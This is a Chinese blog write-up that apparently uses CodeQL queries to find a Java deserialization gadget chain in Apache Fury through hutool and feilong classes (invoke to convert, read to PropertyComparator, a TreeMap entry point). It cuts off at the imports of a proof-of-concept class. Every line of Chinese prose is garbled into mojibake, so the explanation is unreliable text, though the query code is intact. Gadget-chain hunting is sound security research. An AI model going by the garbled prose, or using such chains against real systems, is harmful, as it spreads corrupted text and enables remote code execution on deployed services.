<p>é‚£ä¹Ÿå°±æ˜¯å…ˆæ‰¾<code>readObject</code>ç‚¹äº†å‘—</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">å®šä¹‰</span><span class="w"> </span><span class="n">ObjectInputStream</span><span class="w"> </span><span class="err">åŠå…¶å­ç±»ç±»å‹</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">OISFamily</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="n">RefType</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">OISFamily</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="p">.</span><span class="n">hasQualifiedName</span><span class="p">(</span><span class="s2">&#34;java.io&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;ObjectInputStream&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">or</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="p">.</span><span class="n">getASupertype</span><span class="o">+</span><span class="p">().</span><span class="n">hasQualifiedName</span><span class="p">(</span><span class="s2">&#34;java.io&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;ObjectInputStream&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">//</span><span class="w"> </span><span class="err">æŸ¥æ‰¾æ‰€æœ‰è°ƒç”¨</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">MethodCall</span><span class="w"> </span><span class="k">call</span><span class="p">,</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="k">method</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">method</span><span class="p">.</span><span class="n">hasName</span><span class="p">(</span><span class="s2">&#34;readObject&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">method</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">()</span><span class="w"> </span><span class="n">instanceof</span><span class="w"> </span><span class="n">OISFamily</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">call</span><span class="p">.</span><span class="n">getMethod</span><span class="p">()</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">method</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">not</span><span class="w"> </span><span class="k">call</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;%com.feilong.lib%&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">call</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getName</span><span class="p">()</span><span class="o">!=</span><span class="s2">&#34;readObject&#34;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">call</span><span class="p">,</span><span class="w"> </span><span class="k">call</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="k">call</span><span class="p">.</span><span class="n">getEnclosingCallable</span><span class="p">().</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250425110830846.png" alt="image-20250425110830846"  />
</p>
<p>çœ‹äº†ä¸‹æœ€æœ‰æœºä¼šçš„æ˜¯<code>IoUtil</code>å’Œ<code>JavaSerializer</code>å§ï¼Œå…¶ä»–æ–¹æ³•ä¸å¤ªå¯èƒ½è°ƒç”¨åˆ°</p>
<p>ç„¶åå°±å»çœ‹æ€ä¹ˆè°ƒç”¨åˆ°<code>JavaSerializer</code>ï¼Œç„¶åæˆ‘åˆå»æŠŠ<code>åºåˆ—åŒ–å’Œååºåˆ—åŒ–</code>çš„æµç¨‹åˆå»çœ‹äº†ç¯‡ï¼Œå¾—å‡ºè°ƒç”¨ä¸äº†ï¼ˆä¸åœ¨mapé‡Œï¼Œå…¶ä»–ç‚¹ä¹Ÿæ²¡å‘ç°èƒ½è°ƒç”¨åˆ°çš„ï¼‰ï¼Œä¼°è®¡æ˜¯ä¸“é—¨fury.registeræ‰è¡Œ,ç”¨æ¥æé«˜å…¼å®¹æ€§çš„ æ„Ÿè§‰wwwã€‚ç„¶åè¿˜å»æƒ³äº†ä¸‹èƒ½ä¸èƒ½ä»<code>åºåˆ—åŒ–byte[]</code>é‡Œé¢æ„é€ å‡º<code>JavaSerializer</code>ï¼Œè®©ä»–ååºåˆ—åŒ–å»è°ƒç”¨</p>
<p>çœ‹äº†ååºåˆ—åŒ–å¯¹byte[]çš„å¤„ç†å‘ç°ä¸è¡Œhhï¼Œä»–<code>mapä¸­Serializer</code>ï¼Œåœ¨<code>åºåˆ—åŒ–byte[]</code>é‡Œé¢ä¼šå­˜ä¸€ä¸ª<code>ç´¢å¼•</code>ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥å»mapè°ƒç”¨<code>å¯¹åº”ç´¢å¼•</code>å¾—åˆ°å¯¹åº”çš„<code>Serializer</code>ï¼Œè€Œä¸æ˜¯mapä¸­ï¼Œä¼šå’Œåºåˆ—åŒ–ä¸€æ ·çš„æ­¥éª¤å»<code>newSerializer</code>ã€‚æ‰€ä»¥ä¹Ÿæ“ä½œä¸äº†</p>
<p>é‚£å°±æŠŠç‚¹çœ‹åˆ°<code>IoUtil</code>ï¼Œç„¶åè¿™é‡Œæ€è·¯å°±åº”è¯¥å…ˆä»readæƒ³åŠæ³•å¾€è¿™ä¸ªç‚¹è°ƒç”¨äº†ï¼Œç›´æ¥æŸ¥å‡ºæ¥çš„æœ‰å¾ˆå¤šéƒ½æ˜¯<code>èµ°clone()</code>çš„ã€‚åé¢çœ‹æœ‰æ²¡æœ‰æœºä¼šå†è¯´ï¼Œå…ˆæŠŠwpçš„é‚£æ¡æ•´äº†ï¼Œè¿™é‡Œä¸€ç›´å¾€ä¸Šæ‰¾å¯ä»¥åˆ°<code>AbstractConverter#convert</code></p>
<p>æˆ‘è§‰å¾—qlä¸åˆ»æ„å†™ï¼Œåº”è¯¥è¿˜ä¸èƒ½é€šè¿‡cb getteré‚£ä¸ªç‚¹(ä¸åªæ˜¯getter)åˆ°getè§¦å‘invokeå†åˆ°convertå§</p>
<p>è¿™é‡Œå°±åˆ†ä¸ºä¸¤æ®µäº†ï¼Œåé¢è¿™æ®µæˆ‘å°±ç›´æ¥æ‰¾invokeåˆ°convertInternalï¼ˆè¿™é‡Œresultæœ‰å¾ˆå¤šï¼Œå°±ç›´æ¥å…ˆå†™çš„invokeçš„ï¼‰</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">@kind path-problem
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">semmle</span><span class="p">.</span><span class="n">code</span><span class="p">.</span><span class="n">java</span><span class="p">.</span><span class="n">dataflow</span><span class="p">.</span><span class="n">FlowSources</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">GetMethod</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GetMethod</span><span class="p">()</span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">().</span><span class="n">hasQualifiedName</span><span class="p">(</span><span class="s2">&#34;java.lang.reflect&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;InvocationHandler&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="p">.</span><span class="n">getName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;invoke&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">LookupMethod</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">LookupMethod</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">this</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span><span class="o">=</span><span class="s2">&#34;convert&#34;</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">this</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;cn.hutool.core.convert.AbstractConverter%&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="w"> </span><span class="n">predicate</span><span class="w"> </span><span class="n">edges</span><span class="p">(</span><span class="k">Method</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">a</span><span class="p">.</span><span class="n">polyCalls</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">GetMethod</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">LookupMethod</span><span class="w"> </span><span class="n">sink</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> </span><span class="n">edges</span><span class="o">+</span><span class="p">(</span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;$@ $@ to $@ $@&#34;</span><span class="w"> </span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="k">source</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="p">,</span><span class="k">source</span><span class="p">.</span><span class="n">getName</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sink</span><span class="p">,</span><span class="n">sink</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œè¿™æ¡å’Œwpä¸­è¿˜æŒºç¬¦åˆçš„</p>
<p><img loading="lazy" src="../images/image-20250424154612513.png" alt="image-20250424154612513"  />
</p>
<h3 id="sourceç‚¹">sourceç‚¹<a hidden class="anchor" aria-hidden="true" href="#sourceç‚¹">#</a></h3>
<p>ç„¶åè¿™é‡Œæ‰¾åˆ°readåˆ°compareå°±æ²¡é‚£ä¹ˆåƒçš„äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="cm">/**
</span></span></span><span class="line"><span class="cl"><span class="cm">@kind path-problem
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">import</span><span class="w"> </span><span class="n">semmle</span><span class="p">.</span><span class="n">code</span><span class="p">.</span><span class="n">java</span><span class="p">.</span><span class="n">dataflow</span><span class="p">.</span><span class="n">FlowSources</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">GetMethod</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">GetMethod</span><span class="p">()</span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="k">exists</span><span class="p">(</span><span class="k">Method</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="k">Parameter</span><span class="w"> </span><span class="n">p</span><span class="o">|</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m</span><span class="p">.</span><span class="n">hasName</span><span class="p">(</span><span class="s2">&#34;read&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;org.apache.fury.serializer.Serializer%&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">exists</span><span class="p">(</span><span class="n">m</span><span class="p">.</span><span class="n">getAnOverride</span><span class="p">())</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">p</span><span class="p">.</span><span class="n">getType</span><span class="p">().(</span><span class="n">RefType</span><span class="p">).</span><span class="n">hasQualifiedName</span><span class="p">(</span><span class="s2">&#34;org.apache.fury.memory&#34;</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;MemoryBuffer&#34;</span><span class="p">)</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">p</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s2">&#34;p0&#34;</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">m</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">getCallable</span><span class="p">()</span><span class="w"> </span><span class="k">and</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">this</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">m</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">class</span><span class="w"> </span><span class="n">LookupMethod</span><span class="w"> </span><span class="n">extends</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">LookupMethod</span><span class="p">()</span><span class="w"> </span><span class="err">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">exists</span><span class="p">(</span><span class="n">MethodCall</span><span class="w"> </span><span class="n">a</span><span class="o">|</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">a</span><span class="p">.</span><span class="n">getCallee</span><span class="p">().</span><span class="n">getName</span><span class="p">()</span><span class="o">=</span><span class="s2">&#34;getProperty&#34;</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">and</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">a</span><span class="p">.</span><span class="n">getCaller</span><span class="p">()</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">  
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="w"> </span><span class="n">predicate</span><span class="w"> </span><span class="n">edges</span><span class="p">(</span><span class="k">Method</span><span class="w"> </span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="n">b</span><span class="p">)</span><span class="w"> </span><span class="err">{</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">a</span><span class="p">.</span><span class="n">polyCalls</span><span class="p">(</span><span class="n">b</span><span class="p">)</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="err">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">GetMethod</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">LookupMethod</span><span class="w"> </span><span class="n">sink</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> </span><span class="n">edges</span><span class="o">+</span><span class="p">(</span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">and</span><span class="w"> </span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;com.feilong.core.util.comparator.PropertyComparator%&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="k">source</span><span class="p">,</span><span class="w"> </span><span class="n">sink</span><span class="p">,</span><span class="w"> </span><span class="s2">&#34;$@ $@ to $@ $@&#34;</span><span class="w"> </span><span class="p">,</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="k">source</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">source</span><span class="p">,</span><span class="k">source</span><span class="p">.</span><span class="n">getName</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">(),</span><span class="n">sink</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getName</span><span class="p">(),</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">sink</span><span class="p">,</span><span class="n">sink</span><span class="p">.</span><span class="n">getName</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p><img loading="lazy" src="../images/image-20250424160833113.png" alt="image-20250424160833113"  />
</p>
<p><img loading="lazy" src="../images/image-20250425095603887.png" alt="image-20250425095603887"  />
</p>
<p>å¯ä»¥çœ‹åˆ°æ˜¯æœ‰åå·®çš„ï¼Œç„¶åè¿™é‡Œreadæ–¹æ³•æœ‰å¾ˆå¤šï¼Œå…¶å®å¾ˆå¤šå¯ä»¥æ’é™¤ï¼Œå› ä¸ºè¦<code>è°ƒç”¨</code>åˆ°æ‰è¡Œ &amp; èƒ½<code>å‚¨å­˜å¯¹è±¡</code>æ‰è¡Œï¼ˆæ¯”å¦‚mapï¼‰è¿™ç§ï¼Œ<strong>å› ä¸ºä¸èƒ½å‚¨å­˜å¯¹è±¡çš„è¯ï¼Œä½ åç»­gadgetä¹Ÿæ— æ³•å±•å¼€</strong>ï¼ˆå› ä¸ºä½ <code>èµ·ç‚¹ç±»</code>æœ€å°‘è¦æ»¡è¶³èƒ½<code>è¿˜åŸ</code>ä¸€ä¸ª<code>å¯¹è±¡</code>ï¼Œå¹¶ä½¿è¿™ä¸ªå¯¹è±¡<code>è°ƒç”¨</code>ä¸€ä¸ª<code>æ–¹æ³•</code>å§ï¼‰ã€‚ç„¶åæˆ‘çœ‹äº†å¤§å¤šç»“æœï¼Œå¾ˆå¤šéƒ½å¯ä»¥æ’é™¤æ‰ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å»çœ‹ä»–<code>å®šä¹‰äº†çš„mapSerializer</code>ä¸­æœ‰é‚£äº›ï¼Œç„¶åçœ‹classç±»å‹è¿›è¡Œç­›é€‰ï¼Œç„¶åå¯¹codeql sourceè¿›è¡Œé™åˆ¶ã€‚ç„¶åè¿˜æœ‰å¾ˆå¤šreadåé¢ä¹Ÿæ˜¯æŒ‡å‘<code>CollectionSerializer#read</code>ï¼Œæ‰€ä»¥è¿™ä¸ªç‚¹å¤šå°‘ä¹Ÿä¼šå»ç ”ç©¶ä¸‹ã€‚</p>
<p>ç„¶åæ­£å¸¸æ€è·¯è‚¯å®šä¸ä¼šç›´æ¥å°±æ‰¾compareæ–¹æ³•å˜›ï¼ˆçº¯ç…§ç­”æ¡ˆæ‰¾ï¼‰ï¼Œæ€è·¯çš„è¯æˆ‘è§‰å¾—</p>
<ul>
<li>å¯ä»¥æœ‰ä¸ª<code>sinkmethod</code>é›†åˆï¼Œç„¶åæ‰¾è¿™ä¸ªé›†åˆï¼ˆå°±æ˜¯è¯¯æŠ¥å¾ˆå¤šå°±æ˜¯äº†hhï¼‰</li>
<li>edgeså‡ å±‚ï¼Œç„¶åçœ‹è¿™å‡ å±‚é‡Œé¢æœ‰é‚£äº›<code>å‡½æ•°</code>å¯ä»¥åˆ©ç”¨ï¼Œä½†æ˜¯è¿™ä¸ªè¯¯æŠ¥å°±å¤ªå¤ªå¤§äº†</li>
</ul>
<p>ç„¶åè¿™é‡Œcompareä¸æ˜¯æ²¡æ‰¾åˆ°å¯¹åº”çš„é“¾å­ï¼Œæˆ‘å»çœ‹äº†ä¸‹jdkçš„ç±»ï¼Œcodeqlæ˜¯æ€ä¹ˆå¤„ç†çš„ï¼Œç„¶åå‘ç°æ˜¯è°ƒç”¨çš„<code>class</code>æ–‡ä»¶ï¼Œè€Œä¸”æ„Ÿè§‰èŠ‚ç‚¹ä¹Ÿå‡ºäº†é—®é¢˜ï¼Œæ¯”å¦‚<code>siftUpUsingComparator</code>è¿™ä¸ªæ–¹æ³•å°±æ‰¾ä¸åˆ°ã€‚</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">import</span><span class="w"> </span><span class="n">java</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">RefType</span><span class="w"> </span><span class="n">queueType</span><span class="p">,</span><span class="w"> </span><span class="k">Method</span><span class="w"> </span><span class="n">m</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">where</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w">  </span><span class="n">m</span><span class="p">.</span><span class="n">getDeclaringType</span><span class="p">().</span><span class="n">getASupertype</span><span class="o">*</span><span class="p">().</span><span class="n">getQualifiedName</span><span class="p">().</span><span class="n">matches</span><span class="p">(</span><span class="s2">&#34;java.util.PriorityQueue%&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="n">m</span><span class="p">,</span><span class="n">m</span><span class="p">.</span><span class="n">getLocation</span><span class="p">().</span><span class="n">getFile</span><span class="p">().</span><span class="n">getAbsolutePath</span><span class="p">()</span><span class="w">
</span></span></span></code></pre></div><p>ç„¶åæˆ‘å»æ‰¾ä¸ªäº†<code>jdkçš„æºç </code>ä¸€èµ·åŠ åˆ°<code>æ•°æ®åº“</code>é‡Œï¼Œä½†æ˜¯ç”Ÿæˆè¦å¾ˆä¹…ï¼Œè€Œä¸”å¾ˆå¡ï¼ˆæˆ‘æ˜¯ç›´æ¥åç¼–è¯‘ï¼Œç„¶å<code>codeql database create db-name --language=java --source-root=./sources --build-mode=none</code>ï¼Œç”Ÿæˆçš„ï¼‰<strong>æœ‰å¥½çš„æ–¹æ³•ï¼Œå¸Œæœ›å¸ˆå‚…ä»¬å®‰åˆ©ä¸‹hhï¼ˆwin10ï¼‰</strong></p>
<p>ç”Ÿæˆä¹‹ååŸæœ¬çš„æ²¡æ‰¾å‡ºæ¥ï¼ŒtreeMapçš„æ‰¾å‡ºæ¥ï¼Œhhhã€‚</p>
<p><img loading="lazy" src="../images/image-20250427165851303.png" alt="image-20250427165851303"  />
</p>
<p>ç„¶åç”¨treemapæ”¹äº†ä¸‹å¼€å¤´æ˜¯å¯ä»¥æ‰“çš„ï¼Œæ„é€ æœ‰äº›å°é—®é¢˜ï¼Œé˜²æ­¢ç”Ÿæˆçš„æ—¶å€™è§¦å‘pocï¼Œä¹Ÿæ˜¯ç”¨æœ€<code>æš´åŠ›</code>çš„åå°„è§£å†³äº†</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">tostring_test</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">cn.hutool.core.map.BiMap</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">cn.hutool.core.map.MapProxy</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">cn.hutool.core.util.ReflectUtil</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">cn.hutool.core.util.SerializeUtil</span><span class="p">;</span><span class="w">
